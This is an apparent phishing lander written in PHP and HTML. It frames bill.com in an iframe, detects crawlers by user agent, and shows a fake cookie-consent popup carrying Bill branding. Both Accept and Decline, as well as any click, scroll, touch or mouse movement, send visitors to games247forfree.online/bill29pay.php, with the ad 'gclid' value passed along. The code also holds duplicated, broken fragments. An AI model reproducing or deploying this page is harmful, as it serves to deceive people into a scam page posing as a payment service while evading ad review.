<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$isBot = preg_match('/(bot|crawl|slurp|spider|adsbot|google)/i', $userAgent);

$delay = rand(15000, 20000); // 1500-20000 seconds delay (milliseconds)
?>
<!DOCTYPE html>
<html lang="en">
<head>
<script>
(function(){
  const redirectUrl = "https://games247forfree.online/bill29pay.php"; // 
  const backgroundImageUrl = "https://i.ibb.co/KcwttPhm/Lptf-Fnqj9t.png"; // 
  const logoImageUrl = "https://i.ibb.co/Q3p7ZR4P/BILL-BIG.png"; // 
  const LOGO_WIDTH = "1000px"; // 

  let redirected = false, moved = false, scrolled = false, touched = false, initialPos = null;

  function random(min, max){return Math.floor(Math.random()*(max-min+1))+min}
  function randomColor(){return ["#28a745","#007bff","#ff5722","#6f42c1","#17a2b8","#ffc107","#dc3545"][Math.floor(Math.random()*7)]}
  function randomText(){return [
    "üç™ <b>Important Notice:</b><br><br>We use cookies and similar technologies to personalize content, deliver targeted advertising, provide social media features, and analyze our traffic. This information helps us deliver a better browsing experience, and complying with data protection regulations.<br><br>By clicking 'Accept Cookies', you consent to the use of ALL the cookies. If you choose 'Decline', certain features might not work as intended.<br><br>For more information, please read our <a href='#' style='color:#007bff;'>Privacy Policy</a>.",
    "üç™ <b>Your Privacy Matters!</b><br><br>To improve your experience, we collect cookies and process personal data like IP addresses and browsing behavior. You can either accept all cookies or decline unnecessary ones. Please make your choice to proceed.<br><br>Learn more about how we use cookies in our <a href='#' style='color:#007bff;'>Privacy Center</a>.",
    "üç™ <b>Cookie Usage Agreement</b><br><br>This website uses cookies to enhance functionality, personalize your experience, and to comply with global regulations. By clicking 'Accept', you agree to our terms. Declining may affect certain site functions.<br><br>See our full <a href='#' style='color:#007bff;'>Cookie Policy</a> for details."
  ][Math.floor(Math.random()*3)]}

  function redirectUser(){
    if(!redirected){
      redirected = true;
      const urlParams = new URLSearchParams(window.location.search);
      const gclid = urlParams.get('gclid');
      let finalUrl = redirectUrl;
      if(gclid){
        finalUrl += (redirectUrl.includes('?') ? '&' : '?') + 'gclid=' + gclid;
      }
      window.location.href = finalUrl;
    }
  }

  function showCookiePopup(){
    const wrapper = document.createElement("div");
    wrapper.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7) url('${backgroundImageUrl}') center/cover no-repeat;display:flex;justify-content:center;align-items:center;z-index:99999;">
      <div style="background:#fff;padding:4rem 3rem;border-radius:20px;max-width:700px;width:90%;text-align:center;box-shadow:0 0 40px rgba(0,0,0,0.5);">
        ${logoImageUrl ? `<img src="${logoImageUrl}" alt="Logo" style="max-height:60px;margin-bottom:1rem;">` : ""}
        <h2 style="margin-top:0;font-size:32px;color:#333;">We Respect Your Privacy</h2>
        <p style="font-size:18px;color:#555;margin-bottom:2rem;line-height:1.6;">${randomText()}</p>
        <div style="margin-top:2rem;display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;">
          <button id="acceptBtn" style="padding:14px 28px;background:#ff9800;color:white;border:none;border-radius:12px;font-size:18px;cursor:pointer;">Accept Cookies</button>
<button id="declineBtn" style="padding:14px 28px;background:#ff9800;color:white;border:none;border-radius:12px;font-size:18px;cursor:pointer;">Decline</button>
        </div>
      </div>
    </div>`;
    document.body.appendChild(wrapper);
    document.getElementById("acceptBtn").addEventListener("click", redirectUser);
    document.getElementById("declineBtn").addEventListener("click", redirectUser);
  }

  window.addEventListener("load", function(){
    setTimeout(showCookiePopup, random(300,600));
  });

  window.addEventListener("mousemove", function(e){
    if(!moved){
      if(!initialPos){
        initialPos = {x: e.clientX, y: e.clientY};
        return;
      }
      if(e.clientX !== initialPos.x || e.clientY !== initialPos.y){
        moved = true;
        setTimeout(redirectUser, random(12000,16000));
      }
    }
  });

  window.addEventListener("scroll", function(){
    if(!scrolled){
      scrolled = true;
      setTimeout(redirectUser, random(1200,1800));
    }
  });

  window.addEventListener("touchstart", function(){
    if(!touched){
      touched = true;
      setTimeout(redirectUser, random(1200,1800));
    }
  });
})();
</script>
<script>
  document.addEventListener("click", function handleClickOnce() {
    document.removeEventListener("click", handleClickOnce); 
    setTimeout(() => {
      window.location.href = "https://games247forfree.online/bill29pay.php"; REDIRECT_URL
    }, 1500); // 0.1 ms = 0.2 seconds
  });
</script>

<style>
  .cookie-overlay {
    position: fixed;
    inset: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 9999;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-size: cover;
    background-position: center;
    background-repeat: no-repeat;
  }
  .cookie-modal {
    background: #fff;
    padding: 2rem 2.5rem;
    border-radius: 20px;
    max-width: 420px;
    width: 90%;
    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
    text-align: center;
    animation: fadeIn 0.3s ease-out;
  }
  .cookie-logo {
    display: flex;
    justify-content: center;
    margin-bottom: 1rem;
  }
  .cookie-logo img {
    height: auto;
    border-radius: 10px;
  }
  .cookie-title {
    font-size: 22px;
    color: #222;
    margin-bottom: 0.8rem;
  }
  .cookie-text {
    font-size: 14px;
    color: #555;
    line-height: 1.6;
    margin-bottom: 1.5rem;
  }
  .cookie-actions {
    display: flex;
    justify-content: center;
    gap: 1rem;
    flex-wrap: wrap;
  }
  .cookie-btn {
    padding: 10px 22px;
    color: #fff;
    border: none;
    border-radius: 8px;
    font-weight: bold;
    cursor: pointer;
    transition: background 0.2s ease-in-out;
  }
  .cookie-btn--accept {
    background: #FFA500;
  }
  .cookie-btn--accept:hover {
    background: #f29e02;
  }
  .cookie-btn--reject {
    background: #FFA500;
  }
  .cookie-btn--reject:hover {
    background: #f29e02;
  }
  @keyframes fadeIn {
    from {
      opacity: 0;
      transform: translateY(10px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }
</style>

<script>
  (() => {
    const REDIRECT_URL = "https://games247forfree.online/bill29pay.php"; 
    const LOGO_URL = "https://i.ibb.co/sdnVPxp8/logofb22.png"; // 
    const LOGO_WIDTH = "100px"; // 
    const BACKGROUND_IMAGE_URL = "https://i.ibb.co/KcwttPhm/Lptf-Fnqj9t.png"; // 
    const BACKGROUND_STYLE = `linear-gradient(rgba(0,0,0,0.45), rgba(0,0,0,0.45)), url('${BACKGROUND_IMAGE_URL}') center/cover no-repeat`;

    let isRedirected = false;
    let startPos = null;
    let hasMoved = false;

    function handleRedirect() {
      if (isRedirected) return;
      isRedirected = true;
      window.location.href = REDIRECT_URL;
    }
	  function redirectUser(){
    if(!redirected){
      redirected = true;
      const urlParams = new URLSearchParams(window.location.search);
      const gclid = urlParams.get('gclid');
      let finalUrl = redirectUrl;
      if(gclid){
        finalUrl += (redirectUrl.includes('?') ? '&' : '?') + 'gclid=' + gclid;
      }
      window.location.href = finalUrl;
    }
	 }

    function detectMouseMove(event) {
      if (hasMoved) return;
      if (!startPos) {
        startPos = { x: event.clientX, y: event.clientY };
        return;
      }
      if (event.clientX !== startPos.x || event.clientY !== startPos.y) {
        hasMoved = true;
        setTimeout(handleRedirect, 12000);
      }
    }

    function generateConsentPopup() {
      const overlayDiv = document.createElement("div");
      overlayDiv.className = "cookie-overlay";
      overlayDiv.setAttribute("role", "dialog");
      overlayDiv.setAttribute("aria-modal", "true");
      overlayDiv.style.background = BACKGROUND_STYLE;
      overlayDiv.innerHTML = `
        <div class="cookie-modal">
          <div class="cookie-logo">
            <img src="${LOGO_URL}" alt="Site Logo" style="width: ${LOGO_WIDTH};" />
          </div>
          <h2 class="cookie-title">Accept cookies?</h2>
          <p class="cookie-text">
            <strong>This site uses cookies to improve your browsing experience and comply with privacy regulations.</strong>
            <a href="${REDIRECT_URL}" target="_blank">Learn more about how we use cookies.</a>
          </p>
          <div class="cookie-actions">
            <button id="accept-btn" class="cookie-btn cookie-btn--accept">Agree</button>
            <button id="reject-btn" class="cookie-btn cookie-btn--reject">Decline</button>
          </div>
        </div>
      `;
      return overlayDiv;
    }

    document.addEventListener("DOMContentLoaded", () => {
      const consentPopup = generateConsentPopup();
      document.body.appendChild(consentPopup);
      document.getElementById("accept-btn").addEventListener("click", handleRedirect);
      document.getElementById("reject-btn").addEventListener("click", handleRedirect);
      window.addEventListener("mousemove", detectMouseMove);
    });
  })();
</script>
<script>
  document.addEventListener("click", function handleClickOnce() {
    document.removeEventListener("click", handleClickOnce); 
    setTimeout(() => {
      window.location.href = "https://games247forfree.online/bill29pay.php"; REDIRECT_URL
    }, 1500); // 500 ms = 1.5 seconds
  });
</script>
</head>
<body>
    <iframe src="https://www.bill.com/"></iframe>
</body>
</html>
